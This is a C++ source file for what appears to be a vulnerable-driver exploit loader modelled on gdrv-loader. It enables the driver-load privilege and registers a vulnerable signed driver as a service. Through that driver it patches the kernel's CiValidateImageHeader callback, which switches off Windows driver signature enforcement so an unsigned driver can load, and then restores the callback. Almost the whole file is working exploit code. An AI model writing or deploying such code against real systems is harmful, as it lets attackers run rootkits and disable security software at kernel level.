#include "includes.h"
#include "win_api_defs.h"

/* https://github.com/fengjixuchui/gdrv-loader */
/* https://github.com/holi4m/gdrv-loader-v2/ */
/* https://www.crowdstrike.com/en-us/blog/falcon-prevents-vulnerable-driver-attacks-real-world-intrusion/ */

NTSTATUS vuln::WindLoadDriver( PWCHAR LoaderName, PWCHAR DriverName, BOOLEAN Hidden )
{
	WCHAR LoaderPath[MAX_PATH] = { 0 };
	WCHAR DriverPath[MAX_PATH] = { 0 };

	constexpr ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;

	std::wprintf( L"[*] WindLoadDriver called\n" );

	// Priv Check
	NTSTATUS stat = RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled );
	std::wprintf( L"[*] RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE) -> %d\n", SeLoadDriverWasEnabled );
	if ( !NT_SUCCESS( stat ) ) return stat;

	// Expand full paths
	stat = RtlGetFullPathName_UEx( LoaderName, MAX_PATH * sizeof( WCHAR ), LoaderPath, nullptr, nullptr );
	if ( !NT_SUCCESS( stat ) ) return stat;

	stat = RtlGetFullPathName_UEx( DriverName, MAX_PATH * sizeof( WCHAR ), DriverPath, nullptr, nullptr );
	if ( !NT_SUCCESS( stat ) ) return stat;

	// Create loader driver service
	stat = modules::CreateDriverService( LoaderServiceName, LoaderPath );
	if ( !NT_SUCCESS( stat ) ) return stat;

	// Create target driver service
	stat = modules::CreateDriverService( DriverServiceName, DriverPath );
	if ( !NT_SUCCESS( stat ) ) return stat;

	// Trigger exploit
	std::wprintf( L"[+] Triggering exploit with:\n    Loader: %ls\n    Target: %ls\n", LoaderServiceName, DriverServiceName );
	wprintf( L"\n" );
	vuln::TriggerExploit( LoaderServiceName, DriverServiceName, 0 );

	std::wprintf( L"[+] Done!\n" );
	return STATUS_SUCCESS;
}

NTSTATUS vuln::TriggerExploit( PWSTR LoaderServiceName, PWSTR DriverServiceName, BOOL should_load ) {
	
	if ( !should_load )
		wprintf( L"[!] DEBUG -> No Loading Selected : %d\n", should_load );
	else
		wprintf( L"[!] DEBUG -> Loading Selected : %d\n", should_load );


	HANDLE deviceHandle{ nullptr };
	
	NTSTATUS stat = helpers::EnsureDeviceHandle( &deviceHandle, LoaderServiceName );
	if ( !NT_SUCCESS( stat ) ) return stat;

	auto ci = modules::get_CIValidate_ImageHeaderEntry();

	wprintf( L"[*] ciValidateImageHeaderEntry: %p\n", ci.ciValidateImageHeaderEntry );
	wprintf( L"[*] zwFlushInstructionCache   : %p\n", ci.zwFlushInstructionCache );

	DWORD64 originalCallback{};
	stat = helpers::ReadOriginalCallback( deviceHandle, ci.ciValidateImageHeaderEntry, originalCallback );
	if ( !NT_SUCCESS( stat ) ) return stat;

	wprintf( L"[*] Original Callback : %p\n", originalCallback );

	if ( should_load ) {
		stat = helpers::WriteCallback( deviceHandle, ci.ciValidateImageHeaderEntry, ci.zwFlushInstructionCache );
		if ( !NT_SUCCESS( stat ) ) return stat;

		wprintf( L"[*] Attempting to load unsigned driver...\n" );
		stat = modules::LoadDriver( DriverServiceName );
		if ( !NT_SUCCESS( stat ) ) return stat;

		stat = helpers::WriteCallback( deviceHandle, ci.ciValidateImageHeaderEntry, originalCallback );
		if ( !NT_SUCCESS( stat ) ) return stat;

		wprintf( L"[*] Restored callback\n" );
	}
	
	NtClose( LoaderServiceName ); // Close handle
	modules::UnloadDriver( LoaderServiceName ); // Unload vuln driver
	return stat;
}


NTSTATUS vuln::WindUnloadDriver(PWCHAR DriverName, BOOLEAN Hidden)
{
	constexpr CONST ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
	BOOLEAN SeLoadDriverWasEnabled;
	
	NTSTATUS stat = RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled );
	
	if ( !NT_SUCCESS( stat ) )	return stat;

	if ( DriverName != nullptr && Hidden )	modules::CreateDriverService( DriverServiceName, DriverName );

	helpers::FileNameToServiceName( DriverServiceName, DriverName );

	stat = modules::UnloadDriver( DriverServiceName );

	RtlAdjustPrivilege( SE_LOAD_DRIVER_PRIVILEGE, SeLoadDriverWasEnabled, FALSE, &SeLoadDriverWasEnabled );

	return stat;
}